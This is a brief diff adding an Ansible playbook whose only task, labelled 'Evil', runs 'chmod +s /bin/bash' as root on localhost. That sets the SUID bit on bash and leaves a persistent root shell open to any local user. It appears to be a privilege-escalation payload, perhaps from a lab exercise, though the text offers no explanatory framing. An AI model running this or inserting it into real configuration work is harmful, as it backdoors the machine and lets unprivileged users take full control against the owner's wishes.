@@ -1,0 +1,6 @@
+- hosts: localhost
+	tasks:
+	  - name: Evil
+	    ansible.builtin.shell: |
+	      chmod +s /bin/bash
+	    become: true
